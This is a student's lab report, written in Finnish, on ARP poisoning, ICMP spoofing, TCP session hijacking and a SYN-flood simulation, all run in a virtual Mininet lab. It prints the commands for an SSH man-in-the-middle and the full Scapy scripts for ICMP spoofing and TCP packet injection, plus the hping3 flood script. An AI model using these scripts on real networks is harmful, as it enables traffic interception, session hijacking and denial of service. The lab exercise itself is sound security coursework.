# H5 Laboratorio- ja simulaatioympäristöt hyökkäyksissä

Tehtävänanto kurssin Moodlesta välilehdeltä "Larin luennot", 5. Laboratorio- ja simulaatioympäristöt hyökkäyksissä (Iso-Anttila s.a.).

## Ympäristö

Kannettava tietokone:

- OS: Windows 11
- Prosessori: AMD Ryzen 5 Pro 4650U
- RAM: 16 GB
- Virtualisointialusta: Oracle VirtualBox
- Virtuaalikone: Moodlesta ladattu Ubuntu Server, jossa tarvittavat asiat valmiiksi asennettuna
- Virtuaalikoneen RAM: 2048 Mt
- Ydinten määrä: 2
- Verkkoasetus VirtualBoxissa: Host-Only Adapter

## a) Aja tunnilla esitetty ARP hyökkäys ja tutki, miten se toimii.

### Ympäristön käyttöönotto

Latasin virtuaalikoneen Moodlesta ja lisäsin sen VirtualBoxiin luomalla uuden virtuaalikoneen ja käyttämällä olemassa olevaa virtuaalilevyä.
Kone käynnistyi onnistuneesti ja toimi kuten pitikin.
Saadakseni ympäristön toimimaan oikein, asensin [Xming](http://www.straightrunning.com/XmingNotes/) ohjelmiston, joka tuo Windowsille X11 tuen.
Näin voin saada näkyviin eri virtuaalikoneiden näytöt käyttäen SSH:ta ja Puttya.
Puttyn asetuksissa `Connection -> SSH -> X11`, laitoin asetuksen "X11 forwarding" päälle ja yhdistin virtuaalikoneen osoitteeseen.

### Toteutus

Seurasin Moodlessa olevaa ohjetta "Mininet luento materiaali ja ohjeet" ARP hyökkäyksen toteuttamisessa.
Käynnistin verkko-ohjaimen virtuaalikoneessa komennolla `ryu-manager ryu.app.simple_switch_13`.
Siirryin sitten takaisin etäyhteyteen ja käynnistin mininetin komennolla `sudo mn --topo single,3 --mac --switch ovsk --controller remote`.
Kokeilin yhteyden toimivuutta komennolla `pingall` ja kaikki liikenne meni perille.

<img width="1315" height="182" alt="image" src="https://github.com/user-attachments/assets/16472570-fba9-4190-a8a9-b850f43d9240" />

Ajoin sitten komennon `xterm h1`, mutta näyttö ei tullut näkyviin.
Poistuin mininetistä `exit` komennolla ja ajoin sitten ohjeissa olleen neuvon mukaan `./get_xauth.sh` skriptin.
Kopioin tulosteen ja ajoin komennon `sudo -s xauth add mininet-vm/unix:10  MIT-MAGIC-COOKIE-1  f3a75b743796418c3dfa0ae9698a189b`.
Käynnistin mininetin uudelleen ja ajoin uudelleen `xterm h1` komennon, jolloin uusi ikkuna avautui h1 koneeseen.
Nyt ympäristö toimi oikein.

Ajoin komennon `arp -n` h1 koneessa tarkistaakseni ARP-taulun sisällön.
Taulussa oli kaksi osoitetta, `10.0.0.2 ja ...3` ja niiden MAC-osoitteet.

<img width="625" height="66" alt="image" src="https://github.com/user-attachments/assets/4f143015-a630-43fc-8ff9-13b8ca8f2c35" />

Avasin sitten mininetistä uuden xtermin h3 koneelle `xterm h3` ja ajoin komennon `sysctl -w net.ipv4.ip_forward=1`.
Komento käskee sysctl kirjoittamaan tiettyyn parametriin tietyn arvon.
`-w` optio käskee kirjoittamaan, `net.ipv4.ip_forward` on parametri johon kirjoitetaan ja `=1` on arvo joka kirjoitetaan.
Arvo 1 kertoo laittamaan parametrin päälle.
`net.ipv4.ip_forward` asetus kertoo Linuxin kernelille välittää IPv4 paketit eteenpäin, eli periaatteessa toimia reitittimenä.
Komento laittaa asetuksen päälle väliaikaisesti, joten kun kone käynnistetään uudelleen, on asetus taas pois päältä oletuksena. (PiMyLifeUp 2024.)

Tämän jälkeen ajoin komennon `iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 22`.
Iptables on työkalu verkkopakettien filtteröintiin.

- `-t nat` optio kertoo iptablesille mitä tablea käyttää, tässä tapauksessa nat.
- `-A PREROUTING` kertoo iptablesille lisätä säännön "PREROUTING" kaikkiin paketteihin. PREROUTING muuttaa paketteja heti kun ne saapuvat.
- `-p tcp` kertoo tehdä asetukset kaikille TCP-protokollan paketeille.
- `--dport 22` on destination port, eli portti johon paketti ohjataan vastaanottajalla.
- `-j REDIRECT` on jump, joka kertoo mitä tehdään jos paketti vastaa edellämainittuja sääntöjä. Redirect toimii nat tablessa, PREROUTING ketjussa.
Se ohjaa paketin itselleen muuttamalla paketin destination address kentän sisääntulevan verkkokortin IP:seen.
- `--to-port 22` on REDIRECT:n optio, joka kertoo mihin porttiin paketti ohjataan. Tämä toimii vain jos `-p tcp` tai `-t udp` on asetettu.

(Die.net s.a.)

Jos ymmärsin komennon toiminnan oikein, iptables siis muokkaa kaikkia porttiin 22 matkalla olevia TCP-paketteja niin, että se on itse vastaanottaja.

Ajoin tämän jälkeen komennot `tcpdump –i h3-eth0 –w arp-p.pcap & wireshark & sshesame -port 22 -listen_address 0.0.0.0` h3 koneella.
Komento käynnistää ohjelman tcpdump ja kertoo sen kuunnella verkkokorttia `h3-eth0`.
`-w arp-p.pcap` kertoo kirjoittamaan kaapatut paketit tiedostoon. (Tcpdump.org 2026.)
`&` operaattori kertoo ohjelman suoritettavan taustalla.
Tämän jälkeen suoritetaan myös wireshark ja sshesame.
Sshesame on SSH "honeypot", joka käynnistää väärennetyn SSH palvelimen, päästää kaikki yhdistävät sisään ja kirjaa niiden liikenteen lokiin (Sshesame 2024).
Optiot kertovat kuunneltavan portin ja osoitteen.

Avasin uuden xterminaalin h3 koneelle ja ajoin python skriptin `python3 ./arp_poison.py`.
Sen jälkeen siirryin takaisin h1 koneelle ja otin ssh yhteyden h2 koneeseen.
Sain ohjeen mukaisen vastauksen, jossa avaimen todennus epäonnistui, koska hostin ja osoitteen 10.0.0.2 avaimet ovat väärät.
Kuvassa näkyy myös h3 koneen lokia.

<img width="1630" height="431" alt="image" src="https://github.com/user-attachments/assets/bcc72974-c8ca-4873-9a51-f59d7d873267" />

Poistin avaimen h1 koneella komennolla `ssh-keygen -R h2`, jonka jälkeen yhdistin uudestaan h2 koneeseen SSH yhteydellä.
Koska avainta ei ole enää muistissa, kysyy ohjelma haluatko yhdistää ja tallettaa avaimen.
Vastaamalla kyllä, avain talletetaan. Sen jälkeen ohjelma varoittaa, että IP-osoitteen 10.0.0.2 avain eroaa hostin h2 avaimesta, mutta sallii yhdistämisen vastaamalla yes.
Nyt sain yhteyden muodostettua. H3 lokissa näkyy yhdistäminen.

<img width="819" height="182" alt="image" src="https://github.com/user-attachments/assets/83923a7e-b561-495b-93e8-6b1ba4440ded" />

### Analyysi

Käsitykseni mukaan h3 kone on yhdistetty verkkoon h1 ja h2 koneiden kanssa, jossa on pelkkä kytkin.
`Arp_poisoning.py` tiedoston koodissa kone lähettää verkkoon ARP-paketteja, joissa se kertoo oman MAC-osoitteensa olevan IP-osoitteen 10.0.0.2 eli h2 MAC-osoite.
Täten 10.0.0.1 eli h1 lähettää paketit koneelle h3.

<img width="607" height="374" alt="image" src="https://github.com/user-attachments/assets/a9722811-055d-4443-93f4-598211676fbb" />

Normaalisti kone ei ottaisi vastaan paketteja, mutta `net.ipv4.ip_forward=1` asetuksella se ottaa niitä vastaan.
Yllä ajetulla `iptables` komennolla h3 muuttaa asetuksiaan ottamaan vastaan TCP-paketteja portista 22 ja ohjaa ne itseensä.
Kun h1 yhdistää h2 koneeseen, yhdistetäänkin oikeasti h3 koneeseen, jonka SSH huomaa avainten ollessa väärät.
Kun avaimet poistetaan h1 muistista, SSH ei löydä avainta ja kysyy, haluaako käyttäjä tallentaa uuden avaimen.
Koska käyttäjä suostuu, huomaa SSH sen jälkeen, ettei avain vastaa IP-osoitteen 10.0.0.2 avainta, ja varoittaa käyttäjää mahdollisesta huijauksesta.
Käyttäjän suostuessa uudelleen yhdistämään, avain korvataan ja jatkossa vastaavia varoituksia ei ilmaannu.
Koska h3 on onnistuneesti huijannut käyttäjän luulemaan sen olevan h2, voi se purkaa SSH salauksen avaimilla ja täten näkee kaikki paketit selkokielisenä.  
En ole täysin varma, ymmärsinkö kaikki komennot ja niiden optiot sekä python koodin oikein, mutta olen aika varma olevani edes oikeilla jäljillä analyysissani.

## b) Samassa hakemistossa on myös ICMP Spoofing ja TCP Session Hijacking. Aja molemmat labrat läpi ja kerro, miten molemmat tekniikat toimivat.

### ICMP Spoofing toteutus

Käynnistin mininet ympäristön samoilla komennoilla kuin aikaisemmin.
Avasin xterminaalit koneille h1 ja h2.
Siirryin molemmilla koneilla hakemistoon `/home/mininet/lab/01-Network-Security-Lab/scripts`.
Pingasin koneella h1 konetta h2 varmistaakseni verkon toiminnan, pingaus onnistui.
Käynnistin koneella h1 skriptin `python3 ./sniff_icmp.py` kaapatakseni ICMP-paketteja.
Sen jälkeen pingasin h1 konetta h2 koneella.
H1 näytti tulosteessa kaapatut ICMP-paketit, sekä kyselyt ja vastaukset.

<img width="676" height="339" alt="image" src="https://github.com/user-attachments/assets/83ef9e2b-f37f-412c-84ff-da9aa5249a00" />

Lopetin skriptin suorittamisen Ctrl+C näppäinyhdistelmällä ja käynnistin toisen skirptin h1 koneella, `python3 ./spoof_icmp.py`. Tämän skriptin tarkoitus on väärentää ICMP-vastauksia.
Pingasin h1 konetta, mutta h1 koneen tuloste ei antanut erityisemmin tietoa, siinä luki vain "sent 1 packets".
Avasin toisen terminaalin h1 koneelle, ajaakseni `sniff_icmp.py` skriptiä samaan aikaan.
Pingasin taas h1 konetta h2 koneella, ja nyt huomasin, että h1 lähetti kaksi vastausta jokaista kyselyä kohden.
H2 vastaanotti kuitenkin vain neljä pakettia.

<img width="696" height="208" alt="image" src="https://github.com/user-attachments/assets/ed3102ad-d0c8-4a95-97b2-c9c8b17751c6" />

<img width="563" height="159" alt="image" src="https://github.com/user-attachments/assets/7ace2867-fe2f-4bea-8c86-97a1d75d715f" />

Luin skriptin `spoof_icmp.py` koodia ja tajusin, että se kuuntelee pingauksia ja lähettää oikean kohteen IP-osoitteella vastauksen.

```
from scapy.all import *

def spoof_icmp(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:  # ICMP Echo Request
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        icmp = ICMP(type=0)  # Echo Reply
        reply = ip / icmp / pkt[Raw].load
        send(reply)

sniff(filter="icmp", prn=spoof_icmp)
```

Päätin kokeilla vielä samaa kolmannella koneella, h3. Jos h1 kuuntelee pingauksia, kun h2 pingaa h3, h1 voisi luultavasti lähettää vastauksia h3 sijaan.
Kokeiltuani ja epäonnistuttuani muistin, ettei h1 voi vastaanottaa muille osoitettuja pingejä, sillä pingit lähetetään unicastina, eli vain kohdeosoitteeseen.

### Analyysi ICMP Spoofing

Skripti `spoof_icmp.py` siis kuuntelee ICMP echo request viestejä, joihin se generoi vastauksen ja lähettää sen.
Tällä hetkellä skripti ottaa vastaukseen lähettäjäksi echo request viestistä vastaanottajan IP-osoitteen, ja vastaanottajaksi echo request viestin lähettäjän.
Pingatessa h2 koneella h1 konetta, ICMP echo reply vastaa todellisuutta, mutta jos kohteena olisi toinen kone, esim. h3 ja tämä yhdistettäisiin ARP-myrkytykseen,
voisi h3 koneelle tarkoitetut pingit ohjautua h1 koneelle, ja se voisi vastata pingiin esittäen h3 konetta.

### TCP Session Hijacking toteutus

Avasin README.md tiedoston mukaisesti terminaalit h1, 2 ja 3 koneille.
Ajoin skriptin `python3 ./tcp_server.py` koneella h1.
Tämän jälkeen ajoin h2 koneella skriptin `python3 ./tcp_client.py`.
Skripti muodosti yhteyden h1 koneen TCP-palvelimeen ja lähetti viestin, sekä vastaanotti viestin palvelimelta.

<img width="678" height="192" alt="image" src="https://github.com/user-attachments/assets/839d97cf-87db-46b0-82ae-1c282329f76a" />

H3 koneen on oltava man-in-the-middle, jotta se voi kaapata paketteja, joten ajoin a-kohdan komennot sen suorittamiseksi.
Muutin SSH:n portin 22 portiksi 12345, joka on h1 TCP-palvelimen portti.
Käynnistin uudessa terminaalissa `arp_poison.py` skriptin.
Lopuksi ajoin skriptit `python3 ./sniff_tcp_session.py` ja `python3 ./tcp_hijack.py` koneella h3 ja ajoin uudelleen h2 koneella `tcp_client.py` skriptin.
H3 näki h2 muodostaman yhteyden, mutta h2 ei saanut yhteyttä palvelimeen.

<img width="325" height="64" alt="image" src="https://github.com/user-attachments/assets/b92445a9-26e3-46df-8078-07e6a5c2ac83" />

<img width="687" height="101" alt="image" src="https://github.com/user-attachments/assets/4924ed64-53ea-4c99-9b82-385c808f7a15" />

Kun `arp_spoofing.py` oli pois päältä ja olin poistanut h2 koneen ARP-taulusta h1 koneen osoitteen, h2 sai jälleen yhteyden h1 koneeseen, mutta h3 ei nähnyt liikennettä näiden välillä.

<img width="677" height="84" alt="image" src="https://github.com/user-attachments/assets/454d1383-a855-4f69-abcb-41c6009e8b0a" />

Kun ajoin `tcp_hijack.py` skriptin, h3 tietenkin näki liikenteen, mutta h1 ei näyttänyt tulosteessaan, että se olisi vastaanottanut liikennettä.

<img width="1256" height="83" alt="image" src="https://github.com/user-attachments/assets/e0f4488a-03a3-4101-8cf2-08dfdf216944" />

<img width="325" height="44" alt="image" src="https://github.com/user-attachments/assets/1e9349d2-f1a8-4d08-ab73-8fe27f00e08f" />

Kokeilin h3 koneella vielä skriptiä `tcp_sniff_and_hijack.py`, jonka pitäisi kai haistella liikennettä ja sitten lähettää paketti, mutta sekään ei toiminut, sillä se ei havainnut liikennettä.

<img width="756" height="52" alt="image" src="https://github.com/user-attachments/assets/aa65864b-89cc-426b-a02f-1692da5dde6b" />

Aloin tekemään analyysia, ja siinä tutkin skriptin `tcp_hijack.py` koodia.
Siihen piti muokata kaapattujen pakettien source port sekä SEQ ja ACK luvut.
Kokeilin tätä vielä kaapatuilla tiedoilla, jotka muokkasin `tcp_hijack.py` tiedostoon.

<img width="324" height="68" alt="image" src="https://github.com/user-attachments/assets/ac4ab9b5-b15f-4aa5-9686-04fc82609205" />

<img width="539" height="234" alt="image" src="https://github.com/user-attachments/assets/ac599a76-d8a7-4eb4-8b55-8f62b55eb01f" />

En saanut h1 koneella vieläkään mitään tulostetta, että liikennettä olisi vastaanotettu, kun ajoin skriptin.
H3 näki kuitenkin vastauksen h1 koneelta TCP-snifferissä.

<img width="685" height="289" alt="image" src="https://github.com/user-attachments/assets/865175b2-6ef3-4851-8cec-75fa9c435563" />

<img width="326" height="114" alt="image" src="https://github.com/user-attachments/assets/767558b3-c862-4efc-a6c2-b0cc445a662e" />

En tiedä teinkö jotain väärin, mutta en usko saaneeni tätä toimimaan oikein.

### Analyysi TCP Session Hijacking

Toimiessaan oikein, hyökkäyksen ideana olisi ymmärtääkseni kuunnella TCP-liikennettä, siepata paketti joka on matkalla palvelimelle ja lähettää sen sijaan väärennetty paketti toisen koneen nimissä.
Näin vastaukset ohjautuisivat hyökkääjän koneelle, joka voisi lukea sisällön selkokielisenä.
Tutkin skriptin `tcp_hijack.py` koodia, ja siihen pitäisi muokata kaapattujen pakettien source port sekä SEQ ja ACK luvut.
En kuitenkaan saanut ilman ARP-myrkytystä mitään kaapattua ja ARP-myrkytyksen ollessa käynnissä, h1 ei tunnu vastaanottavan liikennettä.

`tcp_hijack.py` alkuperäinen koodi:

```
from scapy.all import IP, TCP, send

# Define the sniffed details (modify these based on your captured data)
source_ip = "10.0.0.2" 
destination_ip = "10.0.0.1" 
source_port = 52632  
destination_port = 12345

# Use the captured sequence and acknowledgment numbers
seq_num = 2288396862
ack_num = 1186024865  

# Payload to be injected
payload = "you are hacked!"

ip_layer = IP(src=source_ip, dst=destination_ip)
tcp_layer = TCP(sport=source_port, dport=destination_port, seq=seq_num, ack=ack_num, flags="PA")  

spoofed_packet = ip_layer / tcp_layer / payload


print(f"[*] Sending spoofed packet: {source_ip}:{source_port} -> {destination_ip}:{destination_port}")
send(spoofed_packet)
```

## c) Hakemistossa 02-SDN-DDos_Simulation tryout-kansiossa on työkalut, jotta voit ajaa TCP SYN-Flood-hyökkäyksen turvallisesti. Kirjoita, miten ajoit hyökkäyksen ja miten kyseinen hyökkäys toimii.

Suljin mininetin ja siirryin virtuaalikoneen ikkunaan. Siirryin hakemsitoon 02-SDN... ja ajoin `sudo python3 ./tree_topology.py` tiedoston.
Tämän jälkeen siirryin PuTTY ikkunaan ja ajoin `sudo python3 ./main.py`, mutta se antoi vain virheviestejä.

```
mininet@mininet-vm:~/lab/02-SDN_DDoS_Simulation-tryout$ sudo python3 ./main.py
2026-04-25 07:25:54.394473: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.
2026-04-25 07:25:55.517063: I tensorflow/tsl/cuda/cudart_stub.cc:28] Could not find cuda drivers on your machine, GPU will not be used.
2026-04-25 07:25:55.525880: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
2026-04-25 07:25:58.131702: W tensorflow/compiler/tf2tensorrt/utils/py_utils.cc:38] TF-TRT Warning: Could not find TensorRT
```

`tree_topology.py` kuitenkin jatkoi suorittamista loppuun asti.

<img width="708" height="98" alt="image" src="https://github.com/user-attachments/assets/3ffedaa2-1575-4a8d-bc57-6ff9f4acf444" />

Tulosteen perusteella yksi luoduista virtuaalikoneista lähettää paljon paketteja kohteelle, samalla kun toinen kone lähettää normaaleja pyyntöjä.
Nämä vaihtuvat noin 10 sekunnin välein. Episodeja oli yhteensä 100.

Tutkin koodia ymmärtääkseni paremmin, mitä ohjelma tekee.

```
from mininet.net import Mininet
from mininet.topolib import TreeTopo
from mininet.node import Controller, RemoteController,OVSSwitch

import random
import threading

# Create and start mininet topology
tree_topo = TreeTopo(depth=3, fanout=2)
net = Mininet(topo=tree_topo, controller=RemoteController,switch=OVSSwitch)
net.start()

episode_count = 100
episode_length = 10
no_of_hosts = 8
victim_host_ip = '10.0.0.' + str(no_of_hosts)
spoofed_ip = '10.1.1.1'

# Command line tool hping3 is used to simulate DDoS
def ddos_flood(host):
    # Attack the last host with IP 10.0.0.4
    # timout command is used to abort the hping3 command after the attack was performed for the specifed time
    host.cmd('timeout ' + str(episode_length) + 's hping3 --flood ' + ' -a '+ spoofed_ip +' '+ victim_host_ip)
    host.cmd('killall hping3')


def ddos_benign(host):
    # Send benign packets to victim
    host.cmd('timeout ' + str(episode_length) + 's hping3 ' + victim_host_ip)
    host.cmd('killall hping3')

# In each episode Randomly select attacker and bengin user 
for i in range(episode_count):
    print("Episode "+str(i))
    attacking_host_id = random.randint(0, no_of_hosts - 2) # select a random host in between 1 and no_of_hosts - 1
    attacking_host = net.hosts[attacking_host_id]

    benign_host_id = random.choice([i for i in range(0, no_of_hosts - 2) if i not in [attacking_host_id]])
    benign_host = net.hosts[benign_host_id]
    print("host" + str(attacking_host_id) + " is attacking and host" + str(benign_host_id) + " is sending normal requests")

    # Create seperate threads for attacker and benign user
    t1 = threading.Thread(target=ddos_benign, args=(benign_host,))
    t2 = threading.Thread(target=ddos_flood, args=(attacking_host,)) 
 
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()


net.stop()
```

Analyysini osui aikalailla oikeaan, skripti luo 8 virtuaalikonetta ja verkkoympäristön, jossa se hyökkää IP-osoitteen `10.0.0.8` omaavan koneeseen.
Episodeja on 100, eli hyökkäystä toistetaan eri koneilla 100 kertaa. Jokaista hyökkäystä toteutetaan kymmenen sekunnin ajan, jolloin hyökkääjää ja tavallisten pyyntöjen lähettäjää vaihdetaan.
Hyökkääjän vaihtamisen logiikkana on ymmärtääkseni estää kohdetta estämästä hyökkääjän IP-osoitetta, jotta hyökkäys ei keskeydy.

Tehtävä olisi varmaan ollut selkeämpi, jos `main.py` olisi toiminut. En tiedä olisiko tehtävässä ollut myös enemmän tehtävää.

## Lähdeluettelo

Die.net s.a. iptables(8) - Linux man page. Luettavissa: https://linux.die.net/man/8/iptables. Luettu: 24.04.2026.

Iso-Anttila, L. s.a. Larin luennot - 5. Laboratorio- ja simulaatioympäristöt hyökkäyksissä. Verkkoon tunkeutuminen ja tiedustelu -opintojakson materiaali Moodlessa. Haaga-Helia ammattikorkeakoulu. Luettu: 24.04.2026.

PiMyLifeUp 2024. How to Enable or Disable IP Forwarding on Linux. Luettavissa: https://pimylifeup.com/linux-ip-forwarding/. Luettu: 24.04.2026.

Sshesame 2024. sshesame. Luettavissa: https://github.com/jaksi/sshesame. Luettu: 24.04.2026.

Tcpdump.org 2026. tcpdump(1) man page. Luettavissa: https://www.tcpdump.org/manpages/tcpdump.1.html. Luettu: 24.04.2026.
